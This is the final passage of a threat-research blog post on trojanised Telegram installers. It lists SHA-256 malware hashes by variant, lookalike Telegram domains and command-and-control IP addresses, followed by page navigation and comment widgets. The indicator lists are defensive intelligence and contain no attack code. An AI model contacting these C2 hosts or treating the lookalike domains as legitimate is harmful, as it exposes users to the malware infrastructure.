+<li><code>dc5d1fb0f60c1d2c2b7500e6a3f2c3e0b3e1465f5faf2d6b107baf4832751837</code></li>
+<li><code>eede9bebbb5e411b98ed3ab22287ca405e978ce64edd2c5b488bcb61e979965d</code></li>
+</ul>
+<p>MFC Type 1</p>
+<ul>
+<li><code>08b6dfa7ae14d00adbc97d91da9a3c7a110f473daf0cd08b58a768dd9b9e0fa3</code></li>
+<li><code>1c66307a3d89d758fba6979fd5e36bb904bc94c2f66d1587d0a89f2a8a87bb81</code></li>
+<li><code>399626c3147001fd79cbbf3e3e49da69e662a67a4310196419f6eb3892b05cc4</code></li>
+<li><code>3dd27291ecc80ded11eded0b4f8deb3a727a83538f50edb7a5b09b002241f5ea</code></li>
+<li><code>9e14301f185291b9a50bf32a511ee6561aac3248058d1f414dfd6e42a07326d9</code></li>
+<li><code>b15dd01ddcebd7c81d437151990e591ddce18dcb5f611654c3cd56404620b9f9</code></li>
+</ul>
+<p>MFC Type 2</p>
+<ul>
+<li><code>005e381cb39d53c4574f418f8fd4349fa2ad582950b62b08e8064be580f11d3c</code></li>
+<li><code>04acd866ea0db5b1941601f7045f283841d80aaefa12bb5819027ab34d53a578</code></li>
+<li><code>0dc1dfbe8876f73ff5541ef95b28424c898cd0356ea1076ceba71d938dd1542f</code></li>
+<li><code>1d496cf700989c37d8909de3aec78bc09f8f2d3313833f8d3977ffacc4e8562a</code></li>
+<li><code>1d691137733a5a851baf3e2543b003b7b8d930919a22dc2be91f42bc2456683b</code></li>
+<li><code>2e29c4fdc92aef0afb417e5beb2ad97bf0728c70a00b7ef3a891168fcda53fc6</code></li>
+<li><code>31cd9a8af5f968616ad1de617090cd5f8f27fbdd4003787b0afceb8688dadb5a</code></li>
+<li><code>3d792cde223521f0eaa572e3d1047c1f7cede4723b1b94ce2caad43e1a1dbbd4</code></li>
+<li><code>3de50a7a18d077f6798c4a0f7f4e464a0465f550beb3ca1ce4d532200a097621</code></li>
+<li><code>43f05f360cfd3d5570044c249180ca69956348aa36cf29c35b512f621def0d7a</code></li>
+<li><code>4ffcdb1ea7b09a1e5acb62618e84282a5885700d6021bfd71a52a29a21c5dc2c</code></li>
+<li><code>545bfbc5ba031e9a618b1fd4335b4903b107d810810ada52cfd90f3dad0e0093</code></li>
+<li><code>5d824f213cb523fbf0d22821a7ecdc2ae4b236940dc2fd34b7c7da9e81a725c5</code></li>
+<li><code>60505f49062b3f9da11c4504b08de3d464fb9f61a6f6a4eaf0518aeb52f557e5</code></li>
+<li><code>65a4bf0651b6ccd9c6720d7544c7e152b135d6aa2b9613205a883943619b5623</code></li>
+<li><code>678a48647b4d29a8e910905308412e043b9f3c998e635f78b10fcbf88d8d11bc</code></li>
+<li><code>6b1b3c42e416585de92245baad11b6685764b7d8c62c68648015f0ca3940271f</code></li>
+<li><code>6d419d7d009a04faf99d749fdc89ad38fc9087ba14f459530b07cbf4cdacdd22</code></li>
+<li><code>79cbb0787121082bc579bd53fe3e66cdb894085bc7985c63eebdf97615095b6c</code></li>
+<li><code>7fb7752513ebb52d0a1e25cea30287e2fd28cf62f0d71a6c9557b74f2822cbad</code></li>
+<li><code>84e63e5ccb04af4af9728cfa0666e6cb3dc0dc5dfd8aad2c7c0e783ce29e01fe</code></li>
+<li><code>86175de725b6db0ba20bf2f182fdebce69962c53a80283866dc85ca97be26558</code></li>
+<li><code>ba62ffc87ceb56c4429b2920cfd4c799b85294c0a1c0173c6e1e814e173a8ad6</code></li>
+<li><code>bbbf5c0dadd05d330ac217800fc1e77608cb20b661cc9978efe75749016fb940</code></li>
+<li><code>c3d2c8a41be2751ee589a25c9121f88e884449b8353d250e9d5c6afb87cefaf4</code></li>
+<li><code>c404aa57d3539c077b77d1b7558ad45613e2ffc34982a88e48987ae1ef9828bf</code></li>
+<li><code>c6537b257f76dcbbc8b5f82be2278f243da19d185035142d41a08b4a9a7f607c</code></li>
+<li><code>ce6053b94ad5a0361cf3b40fb57b8428540a81b403929fee1c5dff63272e6505</code></li>
+<li><code>df78865d0ca7b4eb222bb8a615cb753c6ade24bb001fd4e4faa82ef107c0a00e</code></li>
+<li><code>fa5c0489f0669d0040267d5eae10771433cfc395da9de3a7ead8ce136c76b07e</code></li>
+</ul>
+<p>Software Pakcer Protected</p>
+<ul>
+<li><code>8db626c808333c32afee3ea81af391762f5faad6c739ff885d2a5fd6b86cb8e4</code></li>
+<li><code>a3fd90794da97bd7840f1de9ac17c3834c3c24fa0b6bb20cc1f25564df3399b1</code></li>
+<li><code>b178ac5583677fa8174d73879d56caba35424cf4240f945c0c18e1f9f0a743a7</code></li>
+<li><code>d780a6a08cacb2e6e07deb4549c689e3fbaa1e526dedf42612ec77847b5e9758</code></li>
+<li><code>fd885c0cd5dc366d27cf0deb544e7c8887007d8d9a753979793de3e7affeb7c2</code></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th align="center">Domain</th>
+<th align="center">Creation Date</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">bensonman.run</td>
+<td align="center">2020-07-07T00:10:21Z</td>
+</tr>
+<tr>
+<td align="center">telegram-vip.com</td>
+<td align="center">2020-09-21T06:44:59Z</td>
+</tr>
+<tr>
+<td align="center">telegramvips.com</td>
+<td align="center">2020-10-31T13:34:04Z</td>
+</tr>
+<tr>
+<td align="center">ii-telegram.com</td>
+<td align="center">2020-11-04T03:54:40Z</td>
+</tr>
+<tr>
+<td align="center">yy-telegram.com</td>
+<td align="center">2020-11-04T03:54:40Z</td>
+</tr>
+<tr>
+<td align="center">mm-telegram.com</td>
+<td align="center">2020-11-04T03:54:40Z</td>
+</tr>
+<tr>
+<td align="center">a2-telegram.com</td>
+<td align="center">2020-11-05T06:31:22Z</td>
+</tr>
+<tr>
+<td align="center">ak-telegram.com</td>
+<td align="center">2020-11-05T06:31:22Z</td>
+</tr>
+<tr>
+<td align="center">a3-telegram.com</td>
+<td align="center">2020-11-05T06:31:22Z</td>
+</tr>
+<tr>
+<td align="center">a1-telegram.com</td>
+<td align="center">2020-11-05T06:31:22Z</td>
+</tr>
+<tr>
+<td align="center">tt-telegram.com</td>
+<td align="center">2020-11-05T06:31:24Z</td>
+</tr>
+<tr>
+<td align="center">kk-telegram.com</td>
+<td align="center">2020-11-05T06:31:24Z</td>
+</tr>
+<tr>
+<td align="center">potato.fit</td>
+<td align="center">2020-12-01T02:06:07Z</td>
+</tr>
+<tr>
+<td align="center">a6-telegram.com</td>
+<td align="center">2020-12-01T08:36:30Z</td>
+</tr>
+<tr>
+<td align="center">a7-telegram.com</td>
+<td align="center">2020-12-03T05:55:37Z</td>
+</tr>
+<tr>
+<td align="center">potato.red</td>
+<td align="center">2020-12-09T10:21:14Z</td>
+</tr>
+<tr>
+<td align="center">apotato.net</td>
+<td align="center">2020-12-15T02:30:16Z</td>
+</tr>
+<tr>
+<td align="center">apotato.xyz</td>
+<td align="center">2020-12-15T02:30:17Z</td>
+</tr>
+<tr>
+<td align="center">ll-telegram.com</td>
+<td align="center">2020-12-16T12:11:04Z</td>
+</tr>
+<tr>
+<td align="center">c3-telegram.com</td>
+<td align="center">2020-12-19T03:31:02Z</td>
+</tr>
+<tr>
+<td align="center">g3telegram.com</td>
+<td align="center">2020-12-28T10:28:02Z</td>
+</tr>
+<tr>
+<td align="center">telecnsr.com</td>
+<td align="center">2020-12-30T09:00:07Z</td>
+</tr>
+<tr>
+<td align="center">dlyunsvr.com</td>
+<td align="center">2021-01-05T04:41:42Z</td>
+</tr>
+<tr>
+<td align="center">kelectsv.com</td>
+<td align="center">2021-01-05T04:41:42Z</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th align="center">C2 IP</th>
+<th align="center">ASN</th>
+<th align="center">Country</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">103.37.0.178</td>
+<td align="center">136800</td>
+<td align="center">CN</td>
+</tr>
+<tr>
+<td align="center">154.222.103.58</td>
+<td align="center">136800</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">154.222.103.59</td>
+<td align="center">136800</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">154.222.103.60</td>
+<td align="center">136800</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">156.255.212.187</td>
+<td align="center">136800</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">156.255.212.190</td>
+<td align="center">136800</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">175.24.112.88</td>
+<td align="center">45090</td>
+<td align="center">CN</td>
+</tr>
+<tr>
+<td align="center">185.224.168.130</td>
+<td align="center">132721</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">185.224.168.131</td>
+<td align="center">132721</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">185.224.168.132</td>
+<td align="center">132721</td>
+<td align="center">HK</td>
+</tr>
+<tr>
+<td align="center">202.87.221.102</td>
+<td align="center">24321</td>
+<td align="center">MY</td>
+</tr>
+<tr>
+<td align="center">45.64.54.85</td>
+<td align="center">38197</td>
+<td align="center">HK</td>
+</tr>
+</tbody></table>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/Malware/" rel="tag">Malware</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/Telegram/" rel="tag">Telegram</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/Trojan/" rel="tag">Trojan</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                    data-tooltip="分析一個加料的 Telegram for Windows 中文版安裝程式"
+                    aria-label="NEXT: 分析一個加料的 Telegram for Windows 中文版安裝程式"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+                <div id="disqus_thread">
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
+                    data-tooltip="分析一個加料的 Telegram for Windows 中文版安裝程式"
+                    aria-label="NEXT: 分析一個加料的 Telegram for Windows 中文版安裝程式"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+                <li class="post-action">
+                    <a
+                        class="post-action-btn btn btn--default"
+                        href="#disqus_thread"
+                        aria-label="Leave a comment"
+                    >
+                        <i class="fa fa-comment"></i>
+                    </a>
+                </li>
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176?s=110" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">Theo Chen</h4>
+        
+            <div id="about-card-bio"><p>Penetration Testing &#x2F; Malware Analysis &#x2F; Threat Hunting &#x2F; APT Research<br /><br />Ingress Enlightened Agent</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Threat Researcher</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Taipei, Taiwan
+            </div>
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-ntjm1xxqdwr7uhkrlwal4hkgsjrprt8jr4d5cauo3fpjpjoa3nude4bnfikw.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+    
+        <script>
+          var disqus_config = function() {
+            this.page.url = 'https://blog.theo.com.tw/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/';
+              
+            this.page.identifier = 'Research/追蹤看門狗集團：Telegram-捆綁木馬程式的多種型態分析/';
+              
+          };
+          (function() {
+            var d = document, s = d.createElement('script');
+            var disqus_shortname = 'theo-5';
+            s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+          })();
+        </script>
+    
+
+
+
+
+    </body>
+</html>
